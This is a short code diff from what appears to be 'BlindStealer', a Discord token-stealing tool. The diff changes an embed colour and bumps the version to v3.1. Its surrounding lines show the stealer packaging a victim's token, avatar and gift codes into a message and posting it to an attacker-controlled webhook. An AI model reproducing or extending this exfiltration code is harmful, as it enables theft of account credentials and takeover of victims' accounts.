@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username}", color=0x000000)
+            embed = Embed(title=f"{username}", color=0x24262A)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
@@ -359,4 +359,4 @@ class upload_tokens:
                 embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
 
-            self.webhook.send(embed=embed, username="BlindStealer - v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
+            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
